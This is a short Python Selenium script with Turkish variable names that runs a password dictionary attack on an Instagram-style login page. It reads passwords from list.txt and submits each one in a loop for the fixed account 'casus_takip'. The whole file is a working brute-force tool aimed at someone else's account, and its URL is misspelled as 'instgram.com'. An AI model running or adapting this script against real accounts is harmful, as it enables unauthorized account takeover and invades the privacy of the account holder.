from selenium import webdriver
import time

tarayici = webdriver.Firefox()
tarayici.get("https://www.instgram.com/accounts/login")
time.sleep(5)

usernames = tarayici.find_element_by_name("username")
passwords = tarayici.find_element_by_name("password")
giris = tarayici.find_element_by_xpath("/html/body/div[1]/section/main/div/article/div/div[1]/div/form/div/div[3]")


dosya = open('list.txt','r')
for satir in dosya:
    usernames.send_keys('casus_takip')
    passwords.send_keys(satir)
    giris.click()
    
    time.sleep(2)
    usernames.clear()
    passwords.clear()
    

dosya.close()

time.sleep(20)

tarayici.close()
